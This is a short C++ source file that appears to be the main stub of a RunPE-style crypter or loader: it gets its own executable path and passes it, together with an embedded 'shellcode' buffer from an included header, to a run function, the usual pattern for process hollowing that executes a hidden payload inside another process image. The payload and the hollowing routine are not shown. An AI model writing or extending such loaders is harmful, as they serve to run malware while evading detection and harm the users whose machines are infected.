#include <Windows.h>
#include "runPE.h"
#include "shellcode.h"

int main()
{
	

	TCHAR szFilePath[1024];
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
	
	run(LPSTR(szFilePath), shellcode);
	return 0;
}
